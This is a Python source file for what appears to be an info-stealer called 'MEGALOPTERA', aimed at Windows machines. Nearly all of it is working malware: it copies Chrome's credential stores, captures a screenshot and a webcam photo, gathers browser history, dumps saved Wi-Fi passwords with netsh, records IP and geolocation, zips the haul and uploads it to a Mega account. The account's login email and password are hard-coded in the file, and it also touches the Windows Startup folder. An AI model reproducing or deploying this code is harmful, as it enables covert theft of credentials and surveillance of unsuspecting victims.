import cv2
from mss import mss
from zipfile import ZipFile
from requests import get
import time
import smtplib
import shutil
import sys 
import os
import browserhistory as bh   
import subprocess
import requests
from mega import Mega



"""
███╗   ███╗███████╗ ██████╗  █████╗ ██╗      ██████╗ ██████╗ ████████╗███████╗██████╗  █████╗
████╗ ████║██╔════╝██╔════╝ ██╔══██╗██║     ██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██╔══██╗
██║╚██╔╝██║██╔══╝  ██║   ██║██╔══██║██║     ██║   ██║██╔═══╝    ██║   ██╔══╝  ██╔══██╗██╔══██║
██║ ╚═╝ ██║███████╗╚██████╔╝██║  ██║███████╗╚██████╔╝██║        ██║   ███████╗██║  ██║██║  ██
╚═╝     ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝      

"""




def mega():
    mega = Mega()
    m = mega.login('capkakner@proton.me', '//-lisreal07019826..t')
    file = m.upload('windows.zip')
    os.remove("windows.zip")
    time.sleep(1800)
    auto_run()

    


    
log = ''
word = ''
email_char_limit = 20



c_locate_folder = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
p_locate_folder = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Default\Login Data"%(os.environ['USERPROFILE']))
destination_folder = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data \Default \Cache"%(os.environ['USERPROFILE']))

auto_run_path = os.path.normpath(r"%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"%(os.environ['USERPROFILE']))






def auto_run():
    shutil.move("windows.zip", auto_run_path)
    password()







def convert_file():
    files = ZipFile('windows.zip', 'w')
    files.write('location.txt')
    files.write('screenshots.jpg') 
    files.write('outputImage.jpg') 
    files.write('test_ip.txt') 
    files.write('output.txt')
    files.write('crypt.txt')
    files.write('password.txt')
    files.write("browser.txt")
    files.write("wifi-password.txt")
    os.remove("screenshots.jpg")
    os.remove('location.txt')
    os.remove("outputImage.jpg")
    os.remove("test_ip.txt")
    os.remove("output.txt")
    os.remove('crypt.txt')
    os.remove('password.txt')
    os.remove("browser.txt")
    os.remove("wifi-password.txt")
    files.close() 
    mega()
    


    


def ip():
    ip = get(f'https://api.ipify.org/?format=json')
    os.system("ipconfig /all > output.txt")
    file_ip = open("test_ip.txt", "w", encoding='utf-8')
    file_ip.write(str(ip.json()))
    file_ip.close()
    
    screenshots()




def webcam():
    cap = cv2.VideoCapture(0)
    cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1920)
    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 1080)
    ret, frame = cap.read()
    cv2.imwrite("outputImage.jpg", frame)
    
    cap.release()
    cv2.destroyAllWindows()
    browser()



def screenshots():
    output_file = 'screenshots.jpg'
    with mss() as sct:
        sct.shot( output=output_file)
    webcam()
    
    
    
        

def password():
    with open(c_locate_folder, 'r') as file:
        data = file.read().rstrip('\n')
    with open(r"crypt.txt","w" ,encoding = 'utf-8') as p:
        p.write(data)
        
        file.close()
        p.close()



    #Copy of the second file
    with open(p_locate_folder, encoding='cp437') as text:
        crypt = text.read().rstrip('\n')
        with open(r"password.txt", 'w', encoding = 'utf-8') as f:
            f.write(crypt)
            
            text.close()
            f.close()
    
    ip()
        
 

def location():
    geoloc = get(f'http://ip-api.com/json')
    file = open('location.txt', 'w', encoding='utf-8')
    file.write(str(geoloc.json()))
    file.close()
    convert_file()






def wifi_password(): 
    var = 0
    lst = []    
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "Profil Tous les utilisateurs" in i]
    with open(r'wifi-password.txt', 'a') as wifi_info:
        for i in profiles:
            try:
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
                results = [b.split(":")[1][1:-1] for b in results if "Contenu de la cl" in b]
                try:
                    password = "{:<30}| {:<}".format(i, results[0])
                    lst.append(password)
                except:
                    pass
            except:
                pass 
        wifi_info.write("%s\n" % lst)
        wifi_info.close()
        location()
        


def browser():
    browser_history = []
    bh_user = bh.get_username()
    db_path = bh.get_database_paths()
    hist = bh.get_browserhistory()
    browser_history.extend((bh_user, db_path, hist))
    with open( 'browser.txt', 'a') as browser_txt:
        browser_txt.write(str(browser_history))
        
    wifi_password()


auto_run()
